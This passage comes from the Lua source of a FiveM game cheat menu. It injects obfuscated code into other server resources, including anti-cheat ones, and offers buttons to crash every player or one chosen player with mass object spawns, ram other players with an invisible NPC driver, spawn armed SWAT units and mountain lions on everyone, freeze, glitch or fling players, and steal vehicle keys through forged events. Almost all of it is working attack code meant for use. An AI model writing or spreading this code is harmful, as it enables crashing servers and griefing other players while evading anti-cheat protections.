                    LkJhGfDsAqWeRt(ped, face, skin, 0, face, skin, 0, 1.0, 1.0, 0.0, false)

                    local hairMax = FdSaQwErTyUiOp(ped, 2)
                    local hair = hairMax > 1 and math.random(0, hairMax - 1) or 0
                    QwAzXsEdCrVfBg(ped, 2, hair, 0, 2)
                    MnBgVfCdXsZaQw(ped, 0, 0)

                    local brows = RtYuIoPlMnBvCx(2)
                    TyUiOpAsDfGhJk(ped, 2, brows > 1 and math.random(0, brows - 1) or 0, 1.0)
                    ErTyUiOpAsDfGh(ped, 2, 1, 0, 0)

                    DfGhJkLzXcVbNm(ped, 0)
                    DfGhJkLzXcVbNm(ped, 1)
                end

                UxrKYLp378()
            ]])
        end)


        -- Server Tab

        local npc = nil
local npcVehicle = nil
local targetPlayer = nil
local attacking = false
local isCharging = false
local attackFromFront = true

local function GetEntityRightVector(entity)
    local forward = GetEntityForwardVector(entity)
    return vector3(-forward.y, forward.x, 0.0)
end

function KeyboardInput(textEntry, exampleText, maxLength)
    AddTextEntry("FMMC_KEY_TIP1", textEntry)
    DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", exampleText, "", "", "", maxLength)
    while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do Wait(0) end
    if UpdateOnscreenKeyboard() ~= 2 then return GetOnscreenKeyboardResult() else return nil end
end

function StartAttack()
    local input = KeyboardInput("Enter player ID to attack", "", 4)
    local targetId = tonumber(input)
    if not targetId then print("Invalid player ID.") return end
    local targetPed = GetPlayerPed(GetPlayerFromServerId(targetId))
    if not DoesEntityExist(targetPed) then print("Player not found.") return end
    local playerPed = PlayerPedId()
    local vehicle = GetVehiclePedIsIn(playerPed, false)
    if vehicle == 0 then print("You are not in a vehicle.") return end
    TaskLeaveVehicle(playerPed, vehicle, 0)
    Wait(2500)
    ClearPedTasksImmediately(PlayerPedId())
    local model = 'mp_m_freemode_01'
    RequestModel(model)
    while not HasModelLoaded(model) do Wait(100) end
    local spawnCoords = GetEntityCoords(playerPed) + vector3(2.0, 2.0, 0.0)
    npc = CreatePed(4, model, spawnCoords, 0.0, false, false)
    SetEntityVisible(npc, true, false)
    SetEntityLocallyInvisible(npc)
    NetworkSetEntityInvisibleToNetwork(npc, true)
    SetBlockingOfNonTemporaryEvents(npc, true)
    SetPedFleeAttributes(npc, 0, 0)
    SetPedCombatAttributes(npc, 5, true)
    SetEntityProofs(npc, false, false, false, false, false, false, false, true)
    SetPedRelationshipGroupHash(npc, GetHashKey("stealthnpc"))
    SetDriverAbility(npc, 1.0)
    SetDriverAggressiveness(npc, 1.0)
    TaskWarpPedIntoVehicle(npc, vehicle, -1)
    Wait(250)
    npcVehicle = vehicle
    SetVehicleEngineOn(npcVehicle, true, true, false)
    targetPlayer = targetPed
    attacking = true
    print("NPC has started attacking.")
end

function StopAttack()
    attacking = false
    if npc and DoesEntityExist(npc) then 
        SetEntityAsMissionEntity(npc, true, true)
        Citizen.InvokeNative(0x9614299DCB53E54B, Citizen.PointerValueIntInitialized(npc))
    end
    npc = nil
    if npcVehicle and DoesEntityExist(npcVehicle) then 
        SetEntityAsMissionEntity(npcVehicle, true, true)
        Citizen.InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(npcVehicle))
    end
    npcVehicle = nil
    print("NPC and vehicle deleted.")
end

-- Main attack loop thread (create this once, e.g., at the bottom of the file)
CreateThread(function()
    local ragdollCooldown = 0
    while true do
        Wait(100)
        if attacking and npc and npcVehicle and targetPlayer and DoesEntityExist(targetPlayer) then
            if not IsPedInVehicle(npc, npcVehicle, false) then
                TaskWarpPedIntoVehicle(npc, npcVehicle, -1)
                Wait(300)
            end
            local playerCoords = GetEntityCoords(targetPlayer)
            local forward = GetEntityForwardVector(targetPlayer)
            local right = GetEntityRightVector(targetPlayer)
            local function GetForwardOrBackwardPosition(playerCoords, playerForwardVec, direction)
                local offset = 10.0
                if direction == "front" then
                    return playerCoords + playerForwardVec * offset
                elseif direction == "back" then
                    return playerCoords - playerForwardVec * offset
                end
            end
            local direction = attackFromFront and "front" or "back"
            local tryPos = GetForwardOrBackwardPosition(playerCoords, forward, direction)
            local success, safePos = GetSafeCoordForPed(tryPos.x, tryPos.y, tryPos.z, false, 0)
            local spawnPos = nil
            if success then
                spawnPos = safePos
            else
                spawnPos = playerCoords - forward * 10.0
            end
            SetEntityCoords(npcVehicle, spawnPos.x, spawnPos.y, spawnPos.z + 1.0, false, false, false, false)
            local heading = GetHeadingFromVector2d(playerCoords.x - spawnPos.x, playerCoords.y - spawnPos.y)
            SetEntityHeading(npcVehicle, heading)
            Wait(250)
            SetVehicleEngineOn(npcVehicle, true, true, false)
            SetVehicleForwardSpeed(npcVehicle, 40.0)
            TaskVehicleDriveToCoordLongrange(npc, npcVehicle, playerCoords.x, playerCoords.y, playerCoords.z, 100.0, GetEntityModel(npcVehicle), 6.0)
            local vehicleHealth = GetVehicleBodyHealth(npcVehicle)
            local crashDetected = false
            local timeout = GetGameTimer() + 5000
            while GetGameTimer() < timeout and attacking do
                Wait(100)
                local npcPos = GetEntityCoords(npcVehicle)
                local distance = #(npcPos - playerCoords)
                if distance <= 5.0 then
                    break
                end
                local newHealth = GetVehicleBodyHealth(npcVehicle)
                if newHealth < vehicleHealth - 50 and GetGameTimer() > ragdollCooldown then
                    crashDetected = true
                    ragdollCooldown = GetGameTimer() + 3000
                    vehicleHealth = newHealth
                    break
                else
                    vehicleHealth = newHealth
                end
            end
            if crashDetected then
                if DoesEntityExist(npcVehicle) and (IsEntityOnFire(npcVehicle) or GetVehicleEngineHealth(npcVehicle) < 100.0) then
                    print("Vehicle damaged or on fire. Repairing and teleporting.")
                    SetEntityCoords(npcVehicle, spawnPos.x, spawnPos.y, spawnPos.z + 1.0)
                    SetEntityHeading(npcVehicle, heading)
                    SetVehicleFixed(npcVehicle)
                    SetVehicleDeformationFixed(npcVehicle)
                    SetVehicleEngineHealth(npcVehicle, 1000.0)
                    SetVehicleBodyHealth(npcVehicle, 1000.0)
                    SetVehicleUndriveable(npcVehicle, false)
                    SetVehicleEngineOn(npcVehicle, true, true, false)
                    SetPedCanBeKnockedOffVehicle(npc, 1)
                    TaskWarpPedIntoVehicle(npc, npcVehicle, -1)
                    Wait(500)
                else
                    ClearPedTasksImmediately(npc)
                    TaskLeaveVehicle(npc, npcVehicle, 0)
                    Wait(500)
                    SetPedToRagdoll(npc, 3000, 3000, 0, false, false, false)
                    Wait(3500)
                end
            else
                ClearPedTasks(npc)
                attackFromFront = not attackFromFront
                Wait(400)
                local currentHeading = GetEntityHeading(npcVehicle)
                SetEntityHeading(npcVehicle, (currentHeading + 180.0) % 360)
                Wait(500)
            end
        end
    end
end)

-- Add the buttons to the menu (place this where other MachoMenuButton calls are)
MachoMenuButton(ServerTabSections[1], "Start Ram Bot", function()
    if not attacking then
        StartAttack()
    else
        print("NPC is already attacking.")
    end
end)

MachoMenuButton(ServerTabSections[1], "Stop Ram Bot", function()
    if attacking then
        StopAttack()
    else
        print("No attack in progress.")
    end
end)

        MachoMenuButton(ServerTabSections[1], "Crash Everyone", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        local function CrashPlayer(ped)
            local playerPos = GetEntityCoords(ped, false)
            local modelHashes = {
                0x34315488,
                0x6A27FEB1, 0xCB2ACC8,
                0xC6899CDE, 0xD14B5BA3,
                0xD9F4474C, 0x32A9996C,
                0x69D4F974, 0xCAFC1EC3,
                0x79B41171, 0x1075651,
                0xC07792D4, 0x781E451D,
                0x762657C6, 0xC2E75A21,
                0xC3C00861, 0x81FB3FF0,
                0x45EF7804, 0xE65EC0E4,
                0xE764D794, 0xFBF7D21F,
                0xE1AEB708, 0xA5E3D471,
                0xD971BBAE, 0xCF7A9A9D,
                0xC2CC99D8, 0x8FB233A4,
                0x24E08E1F, 0x337B2B54,
                0xB9402F87, 0x4F2526DA
            }

            for i = 1, #modelHashes do
                obj = CreateObject(modelHashes[i], playerPos.x, playerPos.y, playerPos.z, true, true, true)
            end
        end

        for i = 0, 128 do
            if i ~= PlayerId() then
                local targetPed = GetPlayerPed(i)
                if DoesEntityExist(targetPed) then
                    CrashPlayer(targetPed)
                end
            end
        end
    ]])
end)

MachoMenuButton(ServerTabSections[1], "Attach To Player", function()
    MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
        Citizen.CreateThread(function()
        local isAttached = false
        local attachedToPlayer = nil

        while true do
            Citizen.Wait(0) -- Prevent the script from hanging the game

            if IsControlJustReleased(0, 38) then -- 'E' key
                if not isAttached then
                    local playerPed = PlayerPedId()
                    local closestPlayer, closestDistance = GetClosestPlayer()
                    
                    if closestPlayer ~= -1 and closestDistance < 3.0 then
                        local targetPed = GetPlayerPed(closestPlayer)
                        -- Get the bone index for the right hand
                        local boneIndex = GetPedBoneIndex(targetPed, 57005)
                        -- Attach to the player's hand with horizontal rotation
                        AttachEntityToEntity(playerPed, targetPed, boneIndex, 0.0, 0.0, 0.0, 0.0, 90.0, 0.0, false, false, false, false, 2, true)
                        isAttached = true
                        attachedToPlayer = closestPlayer
                        print("Attached to player's hand")
                    else
                        print("No player nearby to attach to")
                    end
                else
                    DetachEntity(PlayerPedId(), true, false)
                    isAttached = false
                    attachedToPlayer = nil
                    print("Detached from player")
                end
            end
        end
    end)

    function GetClosestPlayer()
        local players = GetActivePlayers()
        local closestDistance = -1
        local closestPlayer = -1
        local playerPed = PlayerPedId()
        local playerCoords = GetEntityCoords(playerPed, 0)

        for i = 1, #players do
            local targetPed = GetPlayerPed(players[i])
            if targetPed ~= playerPed then
                local targetCoords = GetEntityCoords(targetPed, 0)
                local distance = Vdist(playerCoords.x, playerCoords.y, playerCoords.z, targetCoords.x, targetCoords.y, targetCoords.z)
                if closestDistance == -1 or closestDistance > distance then
                    closestPlayer = players[i]
                    closestDistance = distance
                end
            end
        end
        
        return closestPlayer, closestDistance
    end
    ]])
end)


        MachoMenuButton(ServerTabSections[1], "SWAT Railgun On Everyone", function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
local swat = "s_m_y_swat_01"
local bR = "weapon_railgun"
for i = 0, 128 do
local coo = GetEntityCoords(GetPlayerPed(i))
RequestModel(GetHashKey(swat))
Citizen.Wait(50)
if HasModelLoaded(GetHashKey(swat)) then
local ped =
CreatePed(21, GetHashKey(swat), coo.x - 1, coo.y, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x + 1, coo.y, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x, coo.y - 1, coo.z, 0, true, true)
CreatePed(21, GetHashKey(swat), coo.x, coo.y + 1, coo.z, 0, true, true)
NetworkRegisterEntityAsNetworked(ped)
if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
local ei = PedToNet(ped)
NetworkSetNetworkIdDynamic(ei, false)
SetNetworkIdCanMigrate(ei, true)
SetNetworkIdExistsOnAllMachines(ei, true)
GiveWeaponToPed(ped, GetHashKey(bR), 9999, 1, 1)
SetPedCanSwitchWeapon(ped, true)
NetToPed(ei)
TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
elseif IsEntityDead(GetPlayerPed(i)) then
TaskCombatHatedTargetsInArea(ped, coo.x, coo.y, coo.z, 500)
else
Citizen.Wait(0)
end
end
end
]])
end)


        MachoMenuButton(ServerTabSections[1], "Spawn Mountain Lion On Everyone", function()
MachoInjectResource(CheckResource("monitor") and "monitor" or CheckResource("oxmysql") and "oxmysql" or "any", [[
local mtlion = "A_C_MtLion"
for i = 0, 128 do
local co = GetEntityCoords(GetPlayerPed(i))
RequestModel(GetHashKey(mtlion))
Citizen.Wait(50)
if HasModelLoaded(GetHashKey(mtlion)) then
local ped =
CreatePed(21, GetHashKey(mtlion), co.x, co.y, co.z, 0, true, true)
NetworkRegisterEntityAsNetworked(ped)
if DoesEntityExist(ped) and not IsEntityDead(GetPlayerPed(i)) then
local ei = PedToNet(ped)
NetworkSetNetworkIdDynamic(ei, false)
SetNetworkIdCanMigrate(ei, true)
SetNetworkIdExistsOnAllMachines(ei, true)
Citizen.Wait(50)
NetToPed(ei)
TaskCombatPed(ped, GetPlayerPed(i), 0, 16)
elseif IsEntityDead(GetPlayerPed(i)) then
TaskCombatHatedTargetsInArea(ped, co.x, co.y, co.z, 500)
else
Citizen.Wait(0)
end
end
end
]])
end)

        MachoMenuButton(ServerTabSections[1], "Kosatka Crash By ID", function()
        MachoInjectResource(CheckResource("es_extended") and "es_extended" or CheckResource("qb-core") and "qb-core" or "any", [[
            local Config = {
        targetPlayerId = nil, -- We'll set this after listing players
        fragmentModel = "kosatka",
        waitTime = 2000,
        spawnAmount = 3000,
        debugMode = true -- Set to false in production
    }

    -- Logging system
    local Log = {
        info = function(msg) print("^3[INFO]^7 " .. msg) end,
        success = function(msg) print("^2[SUCCESS]^7 " .. msg) end,
        error = function(msg) print("^1[ERROR]^7 " .. msg) end,
        warn = function(msg) print("^8[WARNING]^7 " .. msg) end,
        debug = function(msg)
            if Config.debugMode then
                print("^5[DEBUG]^7 " .. msg)
            end
        end
    }

    -- Utility functions
    local Util = {
        requestModel = function(modelHash)
            RequestModel(modelHash)
            local startTime = GetGameTimer()
            while not HasModelLoaded(modelHash) do
                Citizen.Wait(0)
                if GetGameTimer() - startTime > 5000 then -- 5 second timeout
                    Log.error("Model load timed out")
                    return false
                end
            end
            return true
        end,

        getPlayerPed = function(serverId)
            return GetPlayerPed(GetPlayerFromServerId(serverId))
        end,

        getEntityCoords = function(entity)
            return DoesEntityExist(entity) and GetEntityCoords(entity) or nil
        end,

        listPlayers = function()
            local players = GetActivePlayers()
            print("^6Available players:^7")
            for _, playerId in ipairs(players) do
                local playerName = GetPlayerName(playerId)
                local serverID = GetPlayerServerId(playerId)
                print(string.format("^5ID: %d^7 | ^3Name: %s^7", serverID, playerName))
            end
        end,

        inputNumber = function(prompt)
            AddTextEntry('FMMC_KEY_TIP1', prompt)
            DisplayOnscreenKeyboard(1, "FMMC_KEY_TIP1", "", "", "", "", "", 10)
            while UpdateOnscreenKeyboard() ~= 1 and UpdateOnscreenKeyboard() ~= 2 do
                Citizen.Wait(0)
            end
            if UpdateOnscreenKeyboard() ~= 2 then
                local result = GetOnscreenKeyboardResult()
                Citizen.Wait(500)
                return tonumber(result)
            else
                Citizen.Wait(500)
                return nil
            end
        end,

        createObjectForTargetPlayer = function(modelHash, coords, targetPlayerId)
            local obj = CreateObject(modelHash, coords.x, coords.y, coords.z, true, false, true)
            if DoesEntityExist(obj) then
                local netId = NetworkGetNetworkIdFromEntity(obj)
                SetNetworkIdExistsOnAllMachines(netId, true)
                NetworkSetNetworkIdDynamic(netId, false)
                SetNetworkIdCanMigrate(netId, false)
                
                -- Make the object invisible to all players except the target
                Citizen.CreateThread(function()
                    while DoesEntityExist(obj) do
                        SetEntityLocallyInvisible(obj)
                        Citizen.Wait(0)
                    end
                end)
                
                -- Make it visible only for the target player
                local targetPlayerHandle = GetPlayerFromServerId(targetPlayerId)
                if targetPlayerHandle ~= -1 then
                    SetNetworkIdSyncToPlayer(netId, targetPlayerHandle, true)
                end
                
                return obj
            end
            return nil
        end
    }

    -- Main functions
    local function spawnFragmentObject(modelHash, coords, targetPlayerId)
        local obj = Util.createObjectForTargetPlayer(modelHash, coords, targetPlayerId)
        if DoesEntityExist(obj) then
            BreakObjectFragmentChild(obj, 1, true)
            Log.success("Object spawned, fragmented, and networked for target player.")
            return obj
        else
            Log.error("Failed to spawn object.")
            return nil
        end
    end

    local function cleanUp(objects)
        for _, obj in ipairs(objects) do
            if DoesEntityExist(obj) then
                DeleteEntity(obj)
            end
        end
        Log.success(string.format("Deleted %d objects.", #objects))
    end

    -- Main thread
    Citizen.CreateThread(function()
        Util.listPlayers()
        Config.targetPlayerId = Util.inputNumber("Enter target player ID:")
        
        if not Config.targetPlayerId then
            Log.error("Invalid target player ID.")
            return
        end

        local modelHash = GetHashKey(Config.fragmentModel)
        local targetPed = Util.getPlayerPed(Config.targetPlayerId)
        local targetCoords = Util.getEntityCoords(targetPed)

        if not targetCoords then
            Log.error("Target player not found.")
            return
        end

        local success, errorMsg = pcall(function()
            if not Util.requestModel(modelHash) then
                error("Failed to load model")
            end

            local spawnedObjects = {}
            local spawnStart = GetGameTimer()
            local spawnTimeout = 10000 -- 10 seconds timeout for spawning all objects

            for i = 1, Config.spawnAmount do
                if GetGameTimer() - spawnStart > spawnTimeout then
                    Log.error("Spawn process timed out")
                    break
                end

                local obj = spawnFragmentObject(modelHash, targetCoords, Config.targetPlayerId)
                if obj then
                    table.insert(spawnedObjects, obj)
                    Log.debug(string.format("Spawned and networked object %d/%d for target player", #spawnedObjects, Config.spawnAmount))
                else
                    Log.error(string.format("Failed to spawn object %d", i))
                end

                if i < Config.spawnAmount then
                    Citizen.Wait(10)
                end
            end

            local spawnTime = GetGameTimer() - spawnStart
            Log.info(string.format("Spawned %d/%d objects in %d ms", #spawnedObjects, Config.spawnAmount, spawnTime))

            if #spawnedObjects > 0 then
                Log.info(string.format("Waiting for %d ms before cleanup", Config.waitTime))
                Citizen.Wait(Config.waitTime)

                local cleanupStart = GetGameTimer()
                cleanUp(spawnedObjects)
                local cleanupTime = GetGameTimer() - cleanupStart
                Log.info(string.format("Cleanup completed in %d ms", cleanupTime))
            else
                Log.warn("No objects were spawned, skipping cleanup")
            end

            SetModelAsNoLongerNeeded(modelHash)
        end)

        if not success then
            Log.error("An error occurred during script execution: " .. tostring(errorMsg))
        else
            Log.success("Script executed successfully")
        end
    end)
        ]])
    end)

        MachoMenuButton(ServerTabSections[1], "Kick From Vehicle", function()
            local FtZpLaWcVyXbMn = MachoMenuGetSelectedPlayer()
            if FtZpLaWcVyXbMn and FtZpLaWcVyXbMn > 0 then
                MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
                    local function GhJkUiOpLzXcVbNm()
                        local kJfHuGtFrDeSwQa = %d
                        local oXyBkVsNzQuH = _G.GetPlayerPed
                        local yZaSdFgHjKlQ = _G.GetVehiclePedIsIn
                        local wQeRtYuIoPlMn = _G.PlayerPedId
                        local cVbNmQwErTyUiOp = _G.SetVehicleExclusiveDriver_2
                        local ghjawrusdgddsaf = _G.SetPedIntoVehicle

                        local targetPed = oXyBkVsNzQuH(kJfHuGtFrDeSwQa)
                        local veh = yZaSdFgHjKlQ(targetPed, 0)

                        local function nMzXcVbNmQwErTy(func, ...)
                            local _print = print
                            local function errorHandler(ex)
                                -- _print("SCRIPT ERROR: " .. ex)
                            end

                            local argsStr = ""
                            for _, v in ipairs({...}) do
                                if type(v) == "string" then
                                    argsStr = argsStr .. "\"" .. v .. "\", "
                                elseif type(v) == "number" or type(v) == "boolean" then
                                    argsStr = argsStr .. tostring(v) .. ", "
                                else
                                    argsStr = argsStr .. tostring(v) .. ", "
                                end
                            end
                            argsStr = argsStr:sub(1, -3)

                            local script = string.format("return func(%%s)", argsStr)
                            local fn, err = load(script, "@pipboy.lua", "t", { func = func })
                            if not fn then
                                -- _print("Error loading script: " .. err)
                                return nil
                            end

                            local success, result = xpcall(function() return fn() end, errorHandler)
                            if not success then
                                -- _print("Error executing script: " .. result)
                                return nil
                            else
                                return result
                            end
                        end

                        if veh ~= 0 then
                            Wait(100)
                            nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, wQeRtYuIoPlMn(), 1)
                            ghjawrusdgddsaf(wQeRtYuIoPlMn(), veh, -1)
                            
                            Wait(100)
                            nMzXcVbNmQwErTy(cVbNmQwErTyUiOp, veh, 0, 0)
                        end
                    end

                    GhJkUiOpLzXcVbNm()
                ]]):format(FtZpLaWcVyXbMn))
            end
        end)

        MachoMenuButton(ServerTabSections[1], "Freeze Player", function()
            local lPvMxQrTfZb = MachoMenuGetSelectedPlayer()
            if lPvMxQrTfZb and lPvMxQrTfZb > 0 then
                MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
                    local function VtQzAfXyYu()
                        local RqTfBnLpZo = %d
                        local FgTrLpYwVs = GetPlayerPed
                        local EoKdCjXqMg = GetEntityCoords
                        local ZbLpVnXwQr = GetClosestVehicle
                        local WqErTyUiOp = PlayerPedId
                        local AsDfGhJkLz = SetPedIntoVehicle
                        local PoLiKjUhYg = ClearPedTasks
                        local QwErTyUiOp = NetworkRequestControlOfEntity
                        local CxZvBnMaSd = GetGameTimer
                        local VcMnBgTrEl = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local wfjaw4dtdu = CreateThread
                        local tgtPed = FgTrLpYwVs(RqTfBnLpZo)
                        local tgtCoords = EoKdCjXqMg(tgtPed)
                        local veh = cHvBzNtEkQ(tgtCoords, 150.0, 0, 70)

                        if not veh or veh == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        QwErTyUiOp(veh)
                        Wait(100)
                        AsDfGhJkLz(WqErTyUiOp(), veh, -1)
                        VcMnBgTrEl(200)
                        PoLiKjUhYg(WqErTyUiOp())

                        wfjaw4dtdu(function()
                            local start = CxZvBnMaSd()
                            while CxZvBnMaSd() - start < 3000 do
                                TeAxSpDoMj(
                                    veh,
                                    tgtPed,
                                    0.0, 0.0, 10.0,
                                    10.0, 0.0, 0.0,
                                    true, 0, 0,
                                    false, false, 0
                                )
                                VcMnBgTrEl(0)
                            end
                        end)
                    end

                    VtQzAfXyYu()
                ]]):format(lPvMxQrTfZb))
            end
        end)

        MachoMenuButton(ServerTabSections[1], "Glitch Player", function()
            local WzAxPlQvTy = MachoMenuGetSelectedPlayer()
            if WzAxPlQvTy and WzAxPlQvTy > 0 then
                MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
                    local function TnXmLoPrVq()
                        local kPdZoWxNq = %d

                        local LsKjHgFdSa = GetPlayerPed
                        local ZxCvBnMaQw = GetEntityCoords
                        local QtRvBnPoLs = GetClosestVehicle
                        local VcBgTrElMn = PlayerPedId
                        local KdJfGhTyPl = SetPedIntoVehicle
                        local TrLkUyIoPl = ClearPedTasks
                        local MwZlQxNsTp = NetworkRequestControlOfEntity
                        local AsYtGhUiMn = GetGameTimer
                        local WqErTyUiOp = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local CrXeTqLpVi = CreateThread

                        local xGyPtMdLoB = LsKjHgFdSa(kPdZoWxNq)
                        local zUiRpXlAsV = ZxCvBnMaQw(xGyPtMdLoB)
                        local jCaBnErYqK = QtRvBnPoLs(zUiRpXlAsV, 150.0, 0, 70)

                        if not jCaBnErYqK or jCaBnErYqK == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        MwZlQxNsTp(veh)
                        Wait(100)
                        KdJfGhTyPl(VcBgTrElMn(), jCaBnErYqK, -1)
                        WqErTyUiOp(200)
                        TrLkUyIoPl(VcBgTrElMn())

                        CrXeTqLpVi(function()
                            local tGhXpLsMkA = AsYtGhUiMn()
                            local bErXnPoVlC = 3000

                            while AsYtGhUiMn() - tGhXpLsMkA < bErXnPoVlC do
                                TeAxSpDoMj(
                                    jCaBnErYqK,
                                    xGyPtMdLoB,
                                    0, 0, 0,
                                    2000.0, 1460.928, 1000.0,
                                    10.0, 88.0, 600.0,
                                    true, true, true, false, 0
                                )
                                WqErTyUiOp(0)
                            end
                        end)
                    end

                    TnXmLoPrVq()
                ]]):format(WzAxPlQvTy))
            end
        end)

        MachoMenuButton(ServerTabSections[1], "Limbo Player", function()
            local zPlNmAxTeVo = MachoMenuGetSelectedPlayer()
            if zPlNmAxTeVo and zPlNmAxTeVo > 0 then
                MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or (CheckResource("oxmysql") and "oxmysql") or (CheckResource("monitor") and "monitor") or "any", ([[
                    local function VyTxQzWsCr()
                        local lDxNzVrMpY = %d

                        local FgTrLpYwVs = GetPlayerPed
                        local EoKdCjXqMg = GetEntityCoords
                        local ZbLpVnXwQr = GetClosestVehicle
                        local WqErTyUiOp = PlayerPedId
                        local AsDfGhJkLz = SetPedIntoVehicle
                        local PoLiKjUhYg = ClearPedTasks
                        local QwErTyUiOp = NetworkRequestControlOfEntity
                        local CxZvBnMaSd = GetGameTimer
                        local VcMnBgTrEl = Wait
                        local TeAxSpDoMj = AttachEntityToEntityPhysically
                        local CrXeTqLpVi = CreateThread

                        local vUpYrTnMwE = FgTrLpYwVs(lDxNzVrMpY)
                        local xAoPqMnBgR = EoKdCjXqMg(vUpYrTnMwE)
                        local cHvBzNtEkQ = ZbLpVnXwQr(xAoPqMnBgR, 150.0, 0, 70)

                        if not cHvBzNtEkQ or cHvBzNtEkQ == 0 then
                            print("No vehicle nearby | Aborting.")
                            return
                        end

                        QwErTyUiOp(veh)
                        Wait(100)
                        AsDfGhJkLz(WqErTyUiOp(), cHvBzNtEkQ, -1)
                        VcMnBgTrEl(200)
                        PoLiKjUhYg(WqErTyUiOp())

                        CrXeTqLpVi(function()
                            local kYqPmTnVzL = CxZvBnMaSd()
                            local yTbQrXlMwA = 3000
                            local hFrMxWnZuE, dEjKzTsYnL = 180.0, 8888.0

                            while CxZvBnMaSd() - kYqPmTnVzL < yTbQrXlMwA do
                                TeAxSpDoMj(
                                    cHvBzNtEkQ,
                                    vUpYrTnMwE,
                                    0, 0, 0,
                                    hFrMxWnZuE, dEjKzTsYnL, 1000.0,
                                    true, true, true, true, 0
                                )
                                VcMnBgTrEl(0)
                            end
                        end)
                    end

                    VyTxQzWsCr()
                ]]):format(zPlNmAxTeVo))
            end
        end)

        MachoMenuButton(ServerTabSections[1], "Copy Appearance", function()
            local LpOiUyTrEeWq = MachoMenuGetSelectedPlayer()
            if LpOiUyTrEeWq and LpOiUyTrEeWq > 0 then
                MachoInjectResource(CheckResource("oxmysql") and "oxmysql" or "any", ([[
                    local function AsDfGhJkLqWe()
                        local ZxCvBnMqWeRt = %d
                        local UiOpAsDfGhJk = GetPlayerPed
                        local QwErTyUiOpAs = PlayerPedId
                        local DfGhJkLqWeRt = DoesEntityExist
                        local ErTyUiOpAsDf = ClonePedToTarget

                        local TyUiOpAsDfGh = UiOpAsDfGhJk(ZxCvBnMqWeRt)
                        if DfGhJkLqWeRt(TyUiOpAsDfGh) then
                            local YpAsDfGhJkLq = QwErTyUiOpAs()
                            ErTyUiOpAsDf(TyUiOpAsDfGh, YpAsDfGhJkLq)
                        end
                    end

                    AsDfGhJkLqWe()
                ]]):format(LpOiUyTrEeWq))
            end
        end)

        MachoMenuButton(ServerTabSections[1], "Steal Keys", function()
            MachoInjectResource(
                CheckResource("monitor") and "monitor" 
                or CheckResource("oxmysql") and "oxmysql" 
                or "any", [[
                local ped = GetPlayerPed(-1)
        local veh = GetVehiclePedIsIn((ped), true)  
        local plate = GetVehicleNumberPlateText(veh)
        TriggerEvent('vehiclekeys:client:SetOwner',plate)
            ]])
        end)

        MachoMenuButton(ServerTabSections[2], "Crash Nearby [Don't Spam]", function()
        MachoInjectResource((CheckResource("ReaperV4") and "ReaperV4") or 
                                (CheckResource("FiniAC") and "FiniAC") or 
                                (CheckResource("WaveShield") and "WaveShield") or 
                                (CheckResource("monitor") and "monitor") or "any", [[
                local function sfehwq34rw7td()
                    local Nwq7sd2Lkq0pHkfa = CreateThread
                    Nwq7sd2Lkq0pHkfa(function()
                        local hAx9qTeMnb = CreateThread
                        local Jf9uZxcTwa = _G.CreatePed           -- Creates a pedestrian (NPC)
                        local VmzKo3sRt7 = _G.PlayerPedId         -- Gets the player's ped ID
                        local LuZx8nqTys = _G.GetEntityCoords     -- Gets entity coordinates
                        local QksL02vPdt = _G.GetEntityHeading    -- Gets entity heading
                        local Tmn1rZxOq8 = _G.SetEntityCoordsNoOffset -- Sets entity coordinates
                        local PfQsXoEr6b = _G.GiveWeaponToPed    -- Gives a weapon to a ped
                        local WvNay7Zplm = _G.TaskParachute       -- Makes a ped use a parachute
                        local DjRq08bKxu = _G.FreezeEntityPosition -- Freezes entity position
                        local EkLnZmcTya = _G.GetHashKey         -- Gets a model hash key
                        local YdWxVoEna3 = _G.RequestModel       -- Requests a model to load
                        local GcvRtPszYp = _G.HasModelLoaded     -- Checks if a model is loaded
                        local MnVc8sQaLp = _G.SetEntityAsMissionEntity -- Marks entity as mission-related
                        local KrXpTuwq9c = _G.SetModelAsNoLongerNeeded -- Frees model from memory
                        local VdNzWqbEyf = _G.DoesEntityExist    -- Checks if an entity exists
                        local AxWtRuLskz = _G.DeleteEntity       -- Deletes an entity
                        local OplKvms9te = _G.Wait               -- Pauses execution for a specified time
                        local BnQvKdsLxa = _G.GetGroundZFor_3dCoord -- Gets ground Z-coordinate
                        local VmxrLa9Ewt = _G.ApplyForceToEntity -- Applies force to an entity
                        local fwafWAefAg = _G.SetEntityVisible   -- Sets entity visibility
                        local awrt325etd = _G.SetBlockingOfNonTemporaryEvents -- Blocks non-temporary events
                        local awfaw4eraq = _G.SetEntityAlpha     -- Sets entity transparency

                        hAx9qTeMnb(function()
                            -- Get the player's ped and its coordinates/heading
                            local QxoZnmWlae = VmzKo3sRt7() -- Player's ped
                            local EzPwqLtYas = LuZx8nqTys(QxoZnmWlae) -- Player's coordinates
                            local GzqLpAxdsv = QksL02vPdt(QxoZnmWlae) -- Player's heading
                            local ZtXmqLpEas = EzPwqLtYas.z + 1600.0 -- Set Z-coordinate 1600 units above

                            -- Teleport player to high altitude
